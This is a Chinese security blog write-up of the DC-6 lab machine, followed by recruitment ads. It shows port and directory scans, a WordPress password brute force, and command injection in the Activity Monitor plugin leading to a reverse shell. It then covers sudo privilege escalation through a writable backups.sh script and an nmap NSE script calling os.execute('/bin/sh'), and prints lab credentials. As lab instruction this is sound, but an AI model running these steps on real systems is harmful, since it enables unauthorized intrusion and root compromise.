> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5J2s1aO7cSpDX1M2-D1nWQ)

_**声明**_

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测以及文章作者不为此承担任何责任。  
雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

_**_**No.1  
**_**_

_**搭建测试靶机**_

下载地址：https://www.five86.com/dc-6.html  
则靶机 DC-6 ip：192.168.188.161（NAT 连接）  
攻击机 kalilinux ip：192.168.188.144

_**_**No.2  
**_**_

_**信息收集**_

用 netdiscover -r 192.168.188.0/24 扫描 ip，得到靶机 ip 192.168.188.161

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WCic2hM7qJLkTfUSll7EPFicyj6vFYVX4ib5ByNBLDvZrTO5RyjZ9zIDVg/640?wx_fmt=png)

先来端口扫描  
利用 nmap 对目标主机进行端口扫描，发现开放端口：80

```
使用命令：nmap -sV -A 192.168.188.161 -oN dc.nmap
```

```
root@kalilinux:~# nmap -sV -A 192.168.188.161 -oN dc.nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-03 09:43 CST
Nmap scan report for 192.168.188.161
Host is up (0.00038s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)
|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to http://wordy/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:0C:29:DF:CA:2A (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.38 ms 192.168.188.161

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.35 seconds
```

目录扫描  
通过 dirb 命令扫描网站子目录

```
命令：dirb http://wordy/
```

```
root@kalilinux:~# dirb http://wordy/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Dec  3 13:54:01 2020
URL_BASE: http://wordy/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://wordy/ ----
+ http://wordy/index.php (CODE:301|SIZE:0)                                                                                      
+ http://wordy/server-status (CODE:403|SIZE:293)                                                                                
==> DIRECTORY: http://wordy/wp-admin/                                                                                           
==> DIRECTORY: http://wordy/wp-content/                                                                                         
==> DIRECTORY: http://wordy/wp-includes/                                                                                        
+ http://wordy/xmlrpc.php (CODE:405|SIZE:42)                                                                                    
                                                                                                                                
---- Entering directory: http://wordy/wp-admin/ ----
+ http://wordy/wp-admin/admin.php (CODE:302|SIZE:0)                                                                             
==> DIRECTORY: http://wordy/wp-admin/css/                                                                                       
==> DIRECTORY: http://wordy/wp-admin/images/                                                                                    
==> DIRECTORY: http://wordy/wp-admin/includes/                                                                                  
+ http://wordy/wp-admin/index.php (CODE:302|SIZE:0)                                                                             
==> DIRECTORY: http://wordy/wp-admin/js/                                                                                        
==> DIRECTORY: http://wordy/wp-admin/maint/                                                                                     
==> DIRECTORY: http://wordy/wp-admin/network/                                                                                   
==> DIRECTORY: http://wordy/wp-admin/user/                                                                                      
                                                                                                                                
---- Entering directory: http://wordy/wp-content/ ----
+ http://wordy/wp-content/index.php (CODE:200|SIZE:0)                                                                           
==> DIRECTORY: http://wordy/wp-content/plugins/                                                                                 
==> DIRECTORY: http://wordy/wp-content/themes/                                                                                  
                                                                                                                                
---- Entering directory: http://wordy/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                
---- Entering directory: http://wordy/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                
---- Entering directory: http://wordy/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                
---- Entering directory: http://wordy/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                
---- Entering directory: http://wordy/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                
---- Entering directory: http://wordy/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                
---- Entering directory: http://wordy/wp-admin/network/ ----
+ http://wordy/wp-admin/network/admin.php (CODE:302|SIZE:0)                                                                     
+ http://wordy/wp-admin/network/index.php (CODE:302|SIZE:0)                                                                     
                                                                                                                                
---- Entering directory: http://wordy/wp-admin/user/ ----
+ http://wordy/wp-admin/user/admin.php (CODE:302|SIZE:0)                                                                        
+ http://wordy/wp-admin/user/index.php (CODE:302|SIZE:0)                                                                        
                                                                                                                                
---- Entering directory: http://wordy/wp-content/plugins/ ----
+ http://wordy/wp-content/plugins/index.php (CODE:200|SIZE:0)                                                                   
                                                                                                                                
---- Entering directory: http://wordy/wp-content/themes/ ----
+ http://wordy/wp-content/themes/index.php (CODE:200|SIZE:0)                                                                    
                                                                                                                                
-----------------
END_TIME: Thu Dec  3 13:54:40 2020
DOWNLOADED: 32284 - FOUND: 12
root@kalilinux:~#
```

_**_**No.3  
**_**_

_**漏洞利用**_

可知开放 22、80 端口，我们访问一下 80 端口看看，访问不成功。

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WZB48ThON4MuC4lKfmnHlYc8JOlWCTib4bsKnOrDHBZsBI5iaWr2D6Ufw/640?wx_fmt=png)

查看页面发现需要配置域名解析，将目标 ip 地址（192.168.188.161 wordy）添加进 hosts 中。kali 中是 /etc/hosts

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9Ws7OIF0ZVH7icgtpk1PFJbxMCRicRgCXL4GRiaOnqjccK6fWE9L7Pmedgw/640?wx_fmt=png)

成功访问

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WfyBJLsh4Mwowx1HW0bLhujdM1whbagyo2u3n3gQzpgKN3dRYL7tt3w/640?wx_fmt=png)

是 wordpress 的 cms  
使用 wpscan 收集一下用户名信息

```
命令：wpscan --url http://wordy/ -e u
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WjNbZKQ7XVwbhAc26wfNMRZ5xHhiaqPaoyeeTgd0YqJv1WqXOdeCCEFA/640?wx_fmt=png)

得到以下用户名  
Admin, graham,mark,sarah,jens  
保存用户名

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WediabXc0UwZiczziajylqej8yX52xIic3IFghTm5XT9UlT7O6aZN7ib6tUg/640?wx_fmt=png)

DC-6 的作者在这里也给出了密码的提示 https://www.vulnhub.com/entry/dc-6,315/

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9Wx2fOlvgVoARhOCFZ9icLgoYTgJiclG7pSZoFHU3d6RRX5UL8h8Tp5oDA/640?wx_fmt=png)

我们根据提示生成一本字典，用于密码爆破

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WAIkfWJlz2zHrqdQ60CMOs5JJovqTzGVXP1mgNoBbo348fPEzh1Jicwg/640?wx_fmt=png)

暴力破解获得用户名密码

```
命令：wpscan --url wordy -U users.txt -P dc6password.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WTIfIsHrWOROUtezQibBYD1XKNnUO9oliagsRMplFJiczy4quia1e8xWMxA/640?wx_fmt=png)

Mark : helpdesk01  
用户名密码有了，然后登录 wordpress 后台  
通过前面目录扫描得到管理后台的网址为：http://wordy/wp-admin/index.php

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WSodEpicpa8b7bdzYPwzIoaTs2KGBnIzeQ14HIVAYxAIiaOjAGrdApMDA/640?wx_fmt=png)

发现使用了 activity monitor 插件

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WcibX5IN6NFDDXTvVyoYE8tCEoxJdEls2moN8hnib4op7TfOCmzA9OO1Q/640?wx_fmt=png)

查找 activity monitor 插件相关漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WdON5h7urrV4hI0GPZiaXkYpLJK8BHy0eCNNTGvwMdeXL6biaz8iakiaZ3A/640?wx_fmt=png)

查看 45274.htmll 内容

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WhICbSXaiauncmjClPHnx46YPcmD6VFKYQU5euEFjQnyH2d3t0bicCM8w/640?wx_fmt=png)

根据作者的描述，先用作者提供的代码尝试反弹 shell

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WJg1ia75cN4GENTH4HK3b9bAFMDq2icMCoia6I4UZfOashTnj4eT9n80icQ/640?wx_fmt=png)

我们直接利用 / usr/share/exploitdb/exploits/php/webapps / 目录下的 45274.html 文件  
将该 45274.html 文件拷贝到 / root 目录下

```
命令：cp /usr/share/exploitdb/exploits/php/webapps/45274.html dc6.html
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WThVKXvUy32jtxNMu4PIENxHCd91QGEiaac6RCHhAT8nViaqU1Ix7H2pg/640?wx_fmt=png)

直接复制该 HTML，并对其进行修改；

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9W6gLa0RdsJicKEyUSF0Cl8kxNR1WqdXXibsWAI46ylZ3JObL2E1wBE6Jw/640?wx_fmt=png)

完成修改后，我们打开 dc6.html 文件，发现不能够成功反弹出 shell，这条路不通，只能尝试别的了；

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WQZ6Avm9KnS3jibyGvoadicGs49KxLbXTTxwcyiaHLSUr1SDFsoKqB9w4A/640?wx_fmt=png)

通过 BurpSuite 进行抓包，能否成功反弹 shell  
点击 tools，输入框中中如数任意字符，最后点击 lookup 按钮后，进行抓包

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9W69JDw42WLAdiaxkqwcpT2FyUfwMh7fnSlOZF0B34JJJS3yL1wo9x6VQ/640?wx_fmt=png)

用 BurpSuite 进行抓包

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9W2pR5saElicftGnychN1j7I3111sU8CNUricL4NCiadq2BTVGVkyrbxehQ/640?wx_fmt=png)

将该流量导入到 Repeater 中，将 “123456” 改掉，用浏览器去访问它，我这里使用的是 baidu.com, 我们访问 whoami, 查看他的权限

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WmHAPOia3iahGLYWtr9ic6YaGNicEVC7f7cnh8MxzcKzhfyrNmQZTxAMDzQ/640?wx_fmt=png)

结果返回了 www-data，说明确实存在漏洞  
我们就尝试使用 nc 命令进行反弹  
（1）第一步：使用 kali 进行监听；

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WJCc8Ncgfc9Onl6V9fNSeKhF1CZ2iaRNpiawPwZ5EcSCDtKh38blnS7FA/640?wx_fmt=png)

（2）第二步：修改抓包的源码，点击 GO 按钮

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WvePRs66RoELWhThRxL4ibsatU8BPyKljPF3VCOIlfl0nzgbGz5tUqng/640?wx_fmt=png)

（3）第三步：反弹 shell 成功，成功拿下 shell；

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WwqiaAANUN67jcZxeAkMKJXkvL6NgmiccHR6JVMb3kY1bba3GUq4F3xUA/640?wx_fmt=png)

（4）第四步：通过 python 命令进入交互式模式，以便下面额操作；

```
命令：python -c ‘import pty;pty.spawn("/bin/bash")’
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9Wva8yiaFD6rO3Cg9m3LMxytTPP2ZmHjAghAmWIkLKbPWribFdsFC6XaOg/640?wx_fmt=png)

进入交互式模式，我们进行下一步操作

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WZAZ7Vg29Su7lrPCaBm9EKXapk72IGVnPVPZH0Ig20eCE77sXHXUyzw/640?wx_fmt=png)

拿到账号密码

```
graham : GSo7isUM1D4
```

我们使用拿到的账号密码登陆 ssh

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9W2S75e52p5ibdJVP9wiaiaY8E7PoHGDSbSVnUdJPPAwMzCqG8NcAfalEgw/640?wx_fmt=png)

下面提权  
在 jens 的用户目录下发现 shell 脚本，并且此脚本有执行权限

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WicjLvwkwsgKBSOZor0pbfuQfequFcnX9knP0LaiamjZVZFo9VBDDlKlA/640?wx_fmt=png)

此脚本在当前用户下有读写权限，修改脚本内容，在末尾增加 / bin/bash，当执行时可以获得 jens 的 shell

```
echo '/bin/bash'  >> backups.sh
sudo -u jens ./backups.sh
```

成功切换到 jens 用户

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9W3AAicDg2IFjDzRjZNzaere9daqJFsm6ggEu55YDUR0zVrnWDuZu4qDg/640?wx_fmt=png)

查看 jens 可以使用的 root 权限命令，发现 nmap 有执行脚本的功能，通过编写特殊脚本，可以实现利用 nmap 提权

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WSAFKeek2QcTdicVHgPpPsb8iaiaEicRsodgia2h45svUtB6m9ibtdrulynuw/640?wx_fmt=png)

写入如下命令成功拿到 flag：

```
echo 'os.execute("/bin/sh")' >get_root.nse
sudo nmap --script=/home/jens/get_root.nse
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WkzjYXgEFdAKH9eEnGrpq2M0ibHvj7b2PAV4S1xRWwFzyYAia85QnGWyw/640?wx_fmt=png)

_**招聘启事**_

安恒雷神众测 SRC 运营（实习生）  
————————  
【职责描述】  
1.  负责 SRC 的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2.  负责白帽子提交漏洞的漏洞审核、Rank 评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

设计师（实习生）

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
【职位要求】  
1、从事平面设计相关工作 1 年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；精通 photoshop/illustrator/coreldrew / 等设计制作软件；  
3、有品牌传播、产品设计或新媒体视觉工作经历；  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦 19 楼  
学历要求：本科及以上  
工作年限：1 年及以上，条件优秀者可放宽

简历投递至

bountyteam@dbappsecurity.com.cn

安全招聘  
————————  
公司：安恒信息  
岗位：Web 安全 安全研究员  
部门：战略支援部  
薪资：13-30K  
工作年限：1 年 +  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
【岗位职责】  
1. 定期面向部门、全公司技术分享;  
2. 前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3. 负责完成部门渗透测试、红蓝对抗业务;  
4. 负责自动化平台建设  
5. 负责针对常见 WAF 产品规则进行测试并落地 bypass 方案  
【岗位要求】  
1. 至少 1 年安全领域工作经验；  
2. 熟悉 HTTP 协议相关技术  
3. 拥有大型产品、CMS、厂商漏洞挖掘案例；  
4. 熟练掌握 php、java、asp.net 代码审计基础（一种或多种）  
5. 精通 Web Fuzz 模糊测试漏洞挖掘技术  
6. 精通 OWASP TOP 10 安全漏洞原理并熟悉漏洞利用方法  
7. 有过独立分析漏洞的经验，熟悉各种 Web 调试技巧  
8. 熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
【加分项】  
1. 具备良好的英语文档阅读能力；  
2. 曾参加过技术沙龙担任嘉宾进行技术分享；  
3. 具有 CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP 等安全相关资质者；  
4. 具有大型 SRC 漏洞提交经验、获得年度表彰、大型 CTF 夺得名次者；  
5. 开发过安全相关的开源项目；  
6. 具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7. 个人技术博客；  
8. 在优质社区投稿过文章；

岗位：安全红队武器自动化工程师  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 熟练使用 Python、java、c/c++ 等至少一门语言作为主要开发语言；  
2. 熟练使用 Django、flask 等常用 web 开发框架、以及熟练使用 mysql、mongoDB、redis 等数据存储方案；  
3: 熟悉域安全以及内网横向渗透、常见 web 等漏洞原理；  
4. 对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5. 具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

岗位：红队武器化 Golang 开发工程师  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 掌握 C/C++/Java/Go/Python/JavaScript 等至少一门语言作为主要开发语言；  
2. 熟练使用 Gin、Beego、Echo 等常用 web 开发框架、熟悉 MySQL、Redis、MongoDB 等主流数据库结构的设计, 有独立部署调优经验；  
3. 了解 docker，能进行简单的项目部署；  
3. 熟悉常见 web 漏洞原理，并能写出对应的利用工具；  
4. 熟悉 TCP/IP 协议的基本运作原理；  
5. 对安全技术与开发技术有浓厚的兴趣及热情，有主观研究和学习的动力，具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式、消息队列等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。  
简历投递至

bountyteam@dbappsecurity.com.cn

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JVom5fwmc6481zCkHKFfT9WR62icCobuP0BM3WyT1CTn0XianFQGW9lA1Dmv7ZXBuXiaVzlh6Ds6tNpw/640?wx_fmt=jpeg)

专注渗透测试技术

全球最新网络攻击技术

END

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JWCrcXsRRuMSFwRYoT70wZ4g1l4RiaDbiaW0AmzxpeucYTk1IicghqiaHxq1Zf8suibZWWtBUyNqUvnaUw/640?wx_fmt=jpeg)